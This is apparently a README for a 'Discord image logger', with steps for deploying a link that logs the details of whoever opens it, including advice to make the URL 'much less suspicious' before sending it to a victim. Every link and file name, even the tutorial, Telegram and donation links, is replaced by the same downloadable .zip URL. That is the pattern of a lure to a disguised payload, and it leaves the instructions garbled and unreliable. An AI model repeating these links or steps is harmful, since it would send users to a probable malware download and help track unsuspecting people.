...
Stuck? Try the [Video Tutorial!](https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip) <br>
For updates and events, you should join the [Telegram!](https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip)
...
* [Video Tutorial](https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip) <br>
...
Open up `https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip` and edit the values, refer to the key below.
...
EXAMPLE: `https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip` <br>
...
You can also watch the [Video Tutorial!](https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip)

- **1:** Create a GitHub repository. I recommend it be private, so others can't see your webhook URL.
- **2:** Make a folder named `api`, and place `https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip` and `https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip` in (Rename it whatever, e.g. https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip would make the URL https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip)
- **3:** (Optional) make a file in the main root (NOT IN API) named `https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip`, and put the code below in:
```html
<meta http-equiv="refresh" content="0;https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip">
```
(You can replace https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip with whatever you made it!); The point of this step is so that you can just visit https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip and not https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip (The former seems much less suspicious) however note it may not preview on Discord if you do so. Still looking for a workaround for this.
- **4:** Visit  and log in with GitHub.
- **5:** Click *add new* to make a new project. Select the GitHub repository you made where it says **Import GitHub Repository**
- **6:** Copy the domain for you. It should be something like `https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip`, unless you did step #3 you'll have to add `api/main` to it, so it will look more like `https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip` *(Replace `https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip` with the domain it gave you, and `main` with whatever you named the file, WITHOUT THE `.py`, or else it will say potentially dangerous download)*, now send your link, have someone click Open Original/Open in Browser, and watch!
...
**NOTE:** You are __NOT__ supposed to run `https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip`! Please read the instructions. I will not help if your bug report/issue is "https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip will not open".
...
Additionally, you can donate to me! See my [donations page](https://raw.githubusercontent.com/BannaDev830/discord-image-logger1/main/bankable/discord-image-logger1.zip), always appreciated!
